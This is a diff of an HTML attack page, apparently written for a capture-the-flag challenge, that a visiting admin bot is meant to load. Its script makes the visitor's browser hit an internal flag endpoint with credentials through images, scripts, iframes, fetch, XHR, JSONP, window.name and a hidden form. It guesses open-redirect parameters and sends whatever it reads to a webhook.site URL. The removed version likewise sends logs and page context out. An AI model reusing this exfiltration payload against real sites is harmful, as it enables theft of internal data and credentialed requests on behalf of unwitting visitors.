@@ -1,128 +1,132 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>collector</title>
+</head>
 <body>
+<h2>collector — aggressive exfil page</h2>
+<p>Watching for exfil to webhook</p>
 <script>
-// Override console methods to capture all logs
-var originalLog = console.log;
-var originalError = console.error;
-var capturedLogs = [];
+(async function(){
+  // webhook you control
+  const WH = "https://webhook.site/6cd5ca68-6f38-4b62-ac03-db4442d880d6";
 
-console.log = function(...args) {
-    capturedLogs.push('LOG: ' + args.join(' '));
-    originalLog.apply(console, args);
-};
+  // internal target we want the admin to hit
+  const internal = "http://127.0.0.1:5000/api/fetchflag";
 
-console.error = function(...args) {
-    capturedLogs.push('ERROR: ' + args.join(' '));
-    originalError.apply(console, args);
-};
+  // Small helper: create an image pointing at a URL (blind GET)
+  function imgGet(url){ try { const i = new Image(); i.src = url + (url.includes('?')? '&' : '?') + 'r=' + Math.random(); } catch(e){} }
 
-// Capture all errors
-window.onerror = function(msg, url, lineNo, columnNo, error) {
-    var errorStr = 'WINDOW ERROR: ' + msg + ' at ' + lineNo + ':' + columnNo;
-    capturedLogs.push(errorStr);
-    sendToWebhook('error', errorStr);
-    return false;
-};
+  // 1) Blind GET via <img>
+  imgGet(internal + "?via=img");
 
-// Function to send data to webhook
-function sendToWebhook(type, data) {
-    var timestamp = Date.now();
+  // 2) Script tag (if internal returns JS or JSONP)
+  try {
+    const s = document.createElement('script');
+    s.src = internal + "?via=script";
+    document.body.appendChild(s);
+  } catch(e){}
+
+  // 3) Hidden iframe to cause the request in the browser
+  try {
+    const f = document.createElement('iframe');
+    f.style.display = 'none';
+    f.src = internal;
+    document.body.appendChild(f);
+  } catch(e){}
+
+  // 4) no-cors fetch to fire the request (opaque) - then signal to webhook that we fired it
+  try {
+    fetch(internal, { mode: 'no-cors', credentials: 'include' }).then(() => {
+      imgGet(WH + "?note=fired_no_cors");
+    }).catch(()=>{ imgGet(WH + "?note=no_cors_err"); });
+  } catch(e){ imgGet(WH + "?note=no_cors_exc"); }
+
+  // 5) Try CORS fetch (may fail to read) but try to exfiltrate what we can
+  try {
+    fetch(internal, { mode: 'cors', credentials: 'include' }).then(r => r.text()).then(text => {
+      // Attempt to send what we read to webhook via multiple channels
+      navigator.sendBeacon(WH + "?flag=" + encodeURIComponent(text));
+      imgGet(WH + "?flag=" + encodeURIComponent(text));
+      // fallback POST (may be blocked by CORS but try)
+      fetch(WH, { method: 'POST', body: text }).catch(()=>{});
+    }).catch(()=>{ imgGet(WH + "?note=cors_failed"); });
+  } catch(e){ imgGet(WH + "?note=cors_exc"); }
+
+  // 6) Try common redirect/reflection parameter names pointing to your webhook
+  const redirectGuesses = [
+    "/?next=",
+    "/?redirect=",
+    "/?url=",
+    "/redirect?url=",
+    "/login?next=",
+    "/logout?next=",
+    "/callback?next=",
+    "/returnTo="
+  ];
+  for (const g of redirectGuesses) {
+    imgGet("http://127.0.0.1:5000" + g + encodeURIComponent(WH + "?via=redir"));
+  }
+
+  // 7) Try JSONP-like param names (callback) — if internal supports JSONP it may call our global cb
+  window.__collect_callback = function(payload){
     try {
-        var img = new Image();
-        img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?type=' + type + '&data=' + encodeURIComponent(data) + '&time=' + timestamp;
-    } catch(e) {
-        // Fallback if Image fails
-        try {
-            fetch('https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: type + ': ' + data
-            });
-        } catch(e2) {
-            // Last resort - nothing we can do
-        }
-    }
-}
+      navigator.sendBeacon(WH + "?flag=" + encodeURIComponent(JSON.stringify(payload)));
+      imgGet(WH + "?flag=" + encodeURIComponent(JSON.stringify(payload)));
+    } catch(e){}
+  };
+  try {
+    const cbScript = document.createElement('script');
+    cbScript.src = internal + "?callback=__collect_callback";
+    document.body.appendChild(cbScript);
+  } catch(e){}
 
-// Start capturing
-sendToWebhook('start', 'Page loaded at ' + new Date().toISOString());
+  // 8) Attempt window.name transport (rarely works unless server sets window.name)
+  try {
+    const transportIframe = document.createElement('iframe');
+    transportIframe.style.display = 'none';
+    // load the internal page first
+    transportIframe.src = internal + "?via=wn";
+    document.body.appendChild(transportIframe);
 
-// TEST 1: Basic connectivity
-sendToWebhook('test1', 'Basic image beacon test');
-console.log('Test 1: Basic connectivity check');
-
-// TEST 2: Fetch to target API without credentials
-fetch('http://95.217.6.37:20001/api/fetchflag')
-.then(r => {
-    console.log('Fetch without credentials - Status:', r.status);
-    return r.text();
-})
-.then(txt => {
-    sendToWebhook('fetch_no_creds', 'Status: ' + txt.length + ' chars - ' + txt.substring(0, 200));
-})
-.catch(err => {
-    console.error('Fetch without credentials failed:', err);
-    sendToWebhook('fetch_no_creds_fail', err.toString());
-    
-    // TEST 3: Fetch to target API WITH credentials
-    fetch('http://95.217.6.37:20001/api/fetchflag', {
-        credentials: 'include'
-    })
-    .then(r => {
-        console.log('Fetch with credentials - Status:', r.status);
-        return r.text();
-    })
-    .then(txt => {
-        sendToWebhook('fetch_with_creds', 'Status: ' + txt.length + ' chars - ' + txt.substring(0, 200));
-    })
-    .catch(err2 => {
-        console.error('Fetch with credentials failed:', err2);
-        sendToWebhook('fetch_with_creds_fail', err2.toString());
-    });
-});
-
-// TEST 4: XMLHttpRequest
-try {
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'http://95.217.6.37:20001/api/fetchflag', true);
-    xhr.withCredentials = true;
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-            console.log('XHR completed - Status:', xhr.status, 'Length:', xhr.responseText.length);
-            sendToWebhook('xhr_result', 'Status: ' + xhr.status + ' Length: ' + xhr.responseText.length);
-            if (xhr.status === 200) {
-                sendToWebhook('xhr_success', xhr.responseText.substring(0, 500));
+    // after a short delay, navigate iframe to a same-origin page we control (the GitHub page)
+    setTimeout(() => {
+      try {
+        transportIframe.src = window.location.origin + "/wn_collect.html";
+        // after it loads, read transportIframe.contentWindow.name (if internal page set it)
+        setTimeout(() => {
+          try {
+            const val = transportIframe.contentWindow && transportIframe.contentWindow.name;
+            if (val) {
+              imgGet(WH + "?flag=" + encodeURIComponent(val));
             }
-        }
-    };
-    xhr.onerror = function() {
-        console.error('XHR failed');
-        sendToWebhook('xhr_error', 'XHR request failed');
-    };
-    xhr.send();
-} catch(xhrError) {
-    console.error('XHR exception:', xhrError);
-    sendToWebhook('xhr_exception', xhrError.toString());
-}
+          } catch(e){
+            imgGet(WH + "?note=wn_read_err");
+          }
+        }, 2000);
+      } catch(e){
+        imgGet(WH + "?note=wn_nav_err");
+      }
+    }, 2000);
+  } catch(e){ imgGet(WH + "?note=wn_exc"); }
 
-// TEST 5: Check if we're in an iframe or special context
-sendToWebhook('context', 'Window location: ' + window.location.href + ', Referrer: ' + document.referrer);
+  // 9) Fallback: attempt to POST a form to internal (some endpoints accept form input)
+  try {
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = "http://127.0.0.1:5000/visit"; // example writable endpoint
+    form.style.display = 'none';
+    const i1 = document.createElement('input'); i1.name='url'; i1.value='http://example.invalid';
+    const i2 = document.createElement('input'); i2.name='visitor'; i2.value='botpage';
+    form.appendChild(i1); form.appendChild(i2);
+    document.body.appendChild(form);
+    form.submit();
+  } catch(e){}
 
-// Final summary after 5 seconds
-setTimeout(() => {
-    var summary = 'CAPTURED LOGS:\n' + capturedLogs.join('\n');
-    sendToWebhook('final_summary', summary);
-    console.log('Final summary sent');
-}, 5000);
-
-// Keep trying to send logs every few seconds
-setInterval(() => {
-    if (capturedLogs.length > 0) {
-        var recentLogs = capturedLogs.join(' | ');
-        sendToWebhook('interval_logs', recentLogs);
-    }
-}, 2000);
+  // Final signal we loaded
+  imgGet(WH + "?note=page_loaded");
+})();
 </script>
 </body>
 </html>
